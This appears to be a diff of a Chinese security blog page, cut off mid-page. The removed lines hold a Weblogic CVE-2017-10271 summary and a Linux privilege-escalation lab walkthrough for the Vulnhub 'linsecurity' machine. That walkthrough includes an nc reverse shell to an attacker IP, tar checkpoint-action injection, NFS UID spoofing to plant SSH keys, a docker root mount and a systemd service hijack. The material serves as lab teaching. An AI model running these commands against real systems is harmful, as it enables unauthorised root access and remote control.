@@ -6,15 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Solkatt的小窝</title>
+  <title>ERP代码审计 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/page/3/index.html">
+  <meta name="description" content="项目技术分析 通过项目结构，能够看出来使用的技术为前后端分离。在看readme文档可以发现，技术框架分别有：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ERP代码审计">
+<meta property="og:url" content="https://example.com/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="项目技术分析 通过项目结构，能够看出来使用的技术为前后端分离。在看readme文档可以发现，技术框架分别有：">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808132938309.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808140227184.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808140435500.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808143545267.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808143602553.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808144832430.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808152730472.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808160343301.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808160326771.png">
+<meta property="article:published_time" content="2022-08-08T05:25:58.000Z">
+<meta property="article:modified_time" content="2022-08-08T08:21:31.862Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808132938309.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,745 +157,106 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-常见中间件漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-ERP代码审计" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">常见中间件漏洞</a>
+    <h1 class="article-title" itemprop="name">
+      ERP代码审计
     </h1>
   
 
         
-        <a href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2022-04-11T03:38:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-11</time>
+        <a href="/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
+  	<time datetime="2022-08-08T05:25:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Weblogic的<code>WLS-Security</code> 组件对外提供webservice服务，其中使用了<code>XMLDecoder</code>来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可以执行任意命令。</p>
-<p>涉及版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.3.6.0，12.1.3.0.0，12.2.1.1.0</span><br></pre></td></tr></table></figure>
-
-<p>漏洞地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/wsl-wsat/....   //只要是wsl-wsat下的url都会有此漏洞。</span><br><span class="line">比如:</span><br><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/11/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Liunx提权靶场一游" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/">Liunx提权靶场一游</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/" class="archive-article-date">
-  	<time datetime="2022-03-25T02:41:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="靶机地址与安装"><a href="#靶机地址与安装" class="headerlink" title="靶机地址与安装"></a>靶机地址与安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#下载链接</span><br><span class="line">https://www.vulnhub.com/entry/linsecurity-1,244/</span><br><span class="line">用户名密码：bob/secret</span><br><span class="line">#安装与配置</span><br><span class="line">1.修改默认键盘布局[默认不是美式键盘]</span><br><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">[修改前\&quot;符号是shift+2]</span><br><span class="line">vim /etc/default/keyboard</span><br><span class="line">[讲XKBLAYOUT改的值为us]</span><br><span class="line">setupcon</span><br><span class="line">2.配置网卡[Ubuntu 18通过netplan设置网络]</span><br><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br><span class="line">[将enp0s3改为ens33]</span><br><span class="line">netplan apply</span><br></pre></td></tr></table></figure>
-
-<p>网卡配置的时候记得把ens33往前面移动一点点</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325104232243.png" alt="image-20220325104232243"></p>
-<h2 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h2><p>Sudo权限本意是root把本来只能超级用户执行的命令赋予普通用户执行。</p>
-<p>Sudo提权其实是因为管理员平时为了方便，给/etc/sudoers文件配hi不当，从而导致了权限提升的问题。</p>
-<p>当你自己是一个普通用户的时候，可以通过命令<code>sudo-l</code>来查看自己可以执行哪些sudo命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105414439.png" alt="image-20220325105414439"></p>
-<p>可以发现这里，我们有多种命令都被赋予了sudo权限。</p>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ash/#sudo">ash | GTFOBins</a>这个网站可以让我们查阅通过sudo权限如何调用命令获得root权限。比如我们查阅ash</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105749744.png" alt="image-20220325105749744"></p>
-<p>在靶机中键入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>
-
-<p>即可成功提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105839939.png" alt="image-20220325105839939"></p>
-<h2 id="etc-passwd哈希"><a href="#etc-passwd哈希" class="headerlink" title="etc/passwd哈希"></a>etc/passwd哈希</h2><p>liunx的用户密码哈希存储在/etc/shadow文件，普通用户能够看到的是/etc/passwd这个文件。在/etc/passwd中，我们会发现如下形式。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325110314338.png" alt="image-20220325110314338"></p>
-<p>比如<code>root:x:0:0:root:/root:/bin/bash</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.密码，x表示密码保存在/etc/shadow</span><br><span class="line">3.UID，0代表root</span><br><span class="line">4.GID，表示所在组</span><br><span class="line">5.描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other</span><br><span class="line">6.用户主目录</span><br><span class="line">7.默认shell类型</span><br></pre></td></tr></table></figure>
-
-<p>账户的第二列是密码hash，如果该列为x则代表密码哈希存储在/etc/shadow文件上。</p>
-<p>这里我们发现账户insecurity是超级账户（uid，gid为0）并且密码存储在了passwd文件上，借此可以拷贝下来解密</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111759093.png" alt="image-20220325111759093"></p>
-<p>切换用户即可提权成功。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111911455.png" alt="image-20220325111911455"></p>
-<h2 id="etc-shadow哈希"><a href="#etc-shadow哈希" class="headerlink" title="etc/shadow哈希"></a>etc/shadow哈希</h2><p>而/etc/shadow默认只能是root用户权限才能查看。它保存的是加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为9个部分</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111015896.png" alt="image-20220325111015896"></p>
-<p>为什么我们这里能以bob权限看到shadow呢，因为在刚才的sudo提取中，我们看到man命令也是赋予了sudo权限的，所以可以借此看到shadow文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.加密后的密码</span><br><span class="line">3.上次修改密码的时间(从1970.1.1开始的总天数)</span><br><span class="line">4.两次修改密码间隔的最少天数，如果为0，则没有限制</span><br><span class="line">5.两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</span><br><span class="line">6.提前多少天警告用户密码将过期</span><br><span class="line">7.在密码过期之后多少天禁用此用户</span><br><span class="line">8.用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</span><br><span class="line">9.保留</span><br><span class="line">#由示例可知，加密的密码具有固定格式：</span><br><span class="line">$id$salt$encrypted</span><br><span class="line">id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512</span><br><span class="line">salt为盐值,系统随机生成</span><br><span class="line">encrypted表示密码的hash值</span><br></pre></td></tr></table></figure>
-
-<p>由此也可以通过解密hash值，来得到密码。</p>
-<h2 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h2><p>corntab文件格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* * * * * command</span><br><span class="line">分 时 日 月 周 命令</span><br><span class="line">第1列表示分钟1～59 每分钟用*或者 */1表示</span><br><span class="line">第2列表示小时1～23（0表示0点）</span><br><span class="line">第3列表示日期1～31</span><br><span class="line">第4列表示月份1～12</span><br><span class="line">第5列标识号星期0～6（0表示星期天）</span><br><span class="line">第6列要运行的命令</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113416094.png" alt="image-20220325113416094"></p>
-<p>查看<code>corn.daily</code>权限</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113621004.png" alt="image-20220325113621004"></p>
-<p>发现这个定时任务的执行权限是root。接下来查看其内容</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113743063.png" alt="image-20220325113743063"></p>
-<p>知道它是把用户/home目录下的文件使用<code>tar</code>打包备份到<code>/etc/backups</code>下。</p>
-<p>这里涉及到了利用通配符使用tar进行命令注入。</p>
-<p>先在我们自己的kali机器上生成一个nc的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.137.133 lport=4444</span><br></pre></td></tr></table></figure>
-
-<p>在受害机器上的bob目录下，注入一个标志来指定我们的检查点.</p>
-<p><code>--checkpoint是指每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作。</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION</span><br></pre></td></tr></table></figure>
-
-<p>将payload写入一个sh文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/vtqm; nc 192.168.137.133 4444 0&lt;/tmp/vtqm | /bin/sh &gt;/tmp/vtqm 2&gt;&amp;1; rm /tmp/vtqm&quot; &gt; shell.sh</span><br></pre></td></tr></table></figure>
-
-<p>注入一个指定检查点动作的标志</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br></pre></td></tr></table></figure>
-
-<p><code>–checkpoint-action=ACTION</code> 在每个checkpoint（检查点）上执行ACTION</p>
-<p>为什么这个提权能成功呢？因为我们相当于用到了tar命令的<code>--checkpoint</code>与<code>--checkpoint-action</code>参数，让他在打包文件时执行了我们的命令。就反弹了shell。</p>
-<h2 id="敏感隐藏文件"><a href="#敏感隐藏文件" class="headerlink" title="敏感隐藏文件"></a>敏感隐藏文件</h2><p>有时候隐藏文件可能会存放一些重要信息，比如我们搜索home目录下的所有隐藏文件，并用ls -al来显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.*&quot; -type f -path &quot;/home/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>该命令是查找所有隐藏文件。并将无法访问的文件错误信息导入到/dev/null中。这样就会很清楚的只看到可以回显可以查看的文件。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115808687.png" alt="image-20220325115808687"></p>
-<p>发现susan目录下的秘密文件.secret。查看可以知道密码</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115851286.png" alt="image-20220325115851286"></p>
-<h2 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h2><p>Suid这个是uid+s的组合，s指的是特殊权限。一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root权限，就会配置特殊权限</p>
-<p>比如说passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
-<p>使用find命令快速查找所有suid文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm 4000 -type f -exec ls -al &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
-
-<h3 id="xxd提权"><a href="#xxd提权" class="headerlink" title="xxd提权"></a>xxd提权</h3><p>发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-x--- 1 root itservices 18552 Apr 10 2018 /usr/bin/xxd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325161742759.png" alt="image-20220325161742759"></p>
-<p>而组itservices具有执行权限，通过/etc/group发现susan用户属于Itservices用户组。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162035632.png" alt="image-20220325162035632"></p>
-<p>接下来可以通过刚才发现的敏感文件，切换到susan用户。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162858779.png" alt="image-20220325162858779"></p>
-<p>仍然可以使用上篇发现的网站用来查询在xxd有suid的情况下可以提权的命令。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162945722.png" alt="image-20220325162945722"></p>
-<p>这里的<code>LFILE</code>是在命令行中定义的变量，它被用于定义需要查看的文件。这里我们以<code>/etc/shadow</code>作为示例。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163139641.png" alt="image-20220325163139641"></p>
-<h3 id="taskset"><a href="#taskset" class="headerlink" title="taskset"></a>taskset</h3><p>除了xxd之外，在之前还有文件叫taskset也能用来提权。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163502734.png" alt="image-20220325163502734"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163523182.png" alt="image-20220325163523182"></p>
-<h2 id="第三方服务访问"><a href="#第三方服务访问" class="headerlink" title="第三方服务访问"></a>第三方服务访问</h2><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>什么是NFS？</p>
-<p>网络文件系统(NFS)是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准，网络附加存储(NAS)之一。</p>
-<p>我们用kali可以搜索到被害机器上开放着nfs服务。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164716494.png" alt="image-20220325164716494"></p>
-<p>使用命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.137.144</span><br></pre></td></tr></table></figure>
-
-<p>可以查看远程nfs服务器上的共享目录。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164813507.png" alt="image-20220325164813507"></p>
-<p>在kali机器上挂在远程目录</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325170408111.png" alt="image-20220325170408111"></p>
-<p>一般来说，可以把挂载出来的目录立即尝试添加authorized_key文件，从而实现ssh免密码登录，但是这里创造文件是不允许的，因为提示权限不够。即使我们在kali机器上是root权限，但是我们还是没有写入权限，这是因为默认情况下客户端的root身份会被分配成用户<code>nfsnobody</code>。</p>
-<p>解决方法是在kali上创建同靶机系统相同UID且相同用户名的账户，用其来写入文件。(即伪造文件所有者的UID和GID来欺骗nfs服务器。)</p>
-<p>在被害机器中我们可以知道peter账户的uid为1001，gid为1005.</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171318385.png" alt="image-20220325171318385"></p>
-<p>在kali机器中创建相同账户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g 1005 peter</span><br><span class="line">adduser peter -uid 1001 -gid 1005</span><br></pre></td></tr></table></figure>
-
-<p>切换到peter账户，可以在该目录下写文件了。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171521879.png" alt="image-20220325171521879"></p>
-<p>写入ssh公钥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#[攻击机]ssh-keygen生成公私钥对</span><br><span class="line">ssg-keygen</span><br><span class="line">#创建.ssh目录</span><br><span class="line">peter@kali:/mnt/peter$ mkdir .ssh</span><br><span class="line">#传输public key</span><br><span class="line">peter@kali:/mnt/peter$ cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys</span><br><span class="line">#设置权限</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 700 ../.ssh/</span><br><span class="line">peter@kali:/mnt/peter/.ssh$ chmod 600 authorized_keys</span><br><span class="line">#使用私钥登录</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325172400774.png" alt="image-20220325172400774"></p>
-<h2 id="docker组提权"><a href="#docker组提权" class="headerlink" title="docker组提权"></a>docker组提权</h2><p>peter用户属于docker组，docker组的成员，可以根据此漏洞来获取root的shell</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190543341.png" alt="image-20220325190543341"></p>
-<p><a target="_blank" rel="noopener" href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190947875.png" alt="image-20220325190947875"></p>
-<h2 id="systemd配置提权"><a href="#systemd配置提权" class="headerlink" title="systemd配置提权"></a>systemd配置提权</h2><h3 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h3><p>历史上，Linux的启动一直采用init进程。</p>
-<p>下面的命令用来启动服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>
-
-<p>这种方法有两个缺点。</p>
-<p>1.启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
-<p>2.启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使脚本变得很长。</p>
-<p>systemd就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。使用了Systemd，就不需要再用init了。Systemd取代了init，成为了系统的第一个进行（pid等于1），其他进程都是它的子进程。Systemd并不是一个命令，而是一组命令，涉及到系统管理的方方面面。</p>
-<p>systemctl是systemd的主命令，用于管理系统。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 重启系统</span><br><span class="line">$ sudo systemctl reboot</span><br><span class="line"># 关闭系统，切断电源</span><br><span class="line">$ sudo systemctl poweroff systemd-analyze命令用于查看启动耗时。</span><br><span class="line"># 查看启动耗时</span><br><span class="line">$ systemd-analyze</span><br><span class="line"># 查看每个服务的启动耗时</span><br><span class="line">$ systemd-analyze blame</span><br><span class="line"># hostnamectl命令用于查看当前主机的信息。</span><br><span class="line"># 显示当前主机的信息</span><br><span class="line">$ hostnamectl</span><br><span class="line"># 设置主机名</span><br><span class="line">$ sudo hostnamectl set-hostname rhel7</span><br></pre></td></tr></table></figure>
-
-<h3 id="systemd提权"><a href="#systemd提权" class="headerlink" title="systemd提权"></a>systemd提权</h3><p>查看peter用户的systemd配置，发现peter这个用户拥有debug.service文件，并且他对这个文件具有读和写的权限。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325191943553.png" alt="image-20220325191943553"></p>
-<p>如果服务器存在缺陷，可以被覆盖或者修改文件，可以通过修改低权限用户有权访问的.service文件并更改run()命令来将其转换为代码执行。重新启动服务时，将运行攻击者的命令。</p>
-<p>查看debug.service文件，这里我们可以修改<code>Execstart</code>行，除此之外还可以修改<code>ExecStop</code>和<code>ExecReload</code>来自启动和重启服务时执行命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325192434111.png" alt="image-20220325192434111"></p>
-<p><code>/root/debug</code>这是一个二进制服务并且该服务以root身份运行。</p>
-<p>使用一个类似ssh可以sudo执行的方法。让root身份来创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755</span><br><span class="line">/home/peter/systemdbash&#x27; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</span><br></pre></td></tr></table></figure>
-
-<p>该命令的意思是将bash复制到<code>/home/peter/systemdbash</code>下，并赋予权限，便于到时候我们可以直接执行SUID提权。</p>
-<p>之后更改<code>debug.service</code>下的<code>Execstart</code>行为<code>/home/peter/systemdexpl.sh</code></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325193614818.png" alt="image-20220325193614818"></p>
-<p>接下来就可以利用suid提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325194131842.png" alt="image-20220325194131842"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
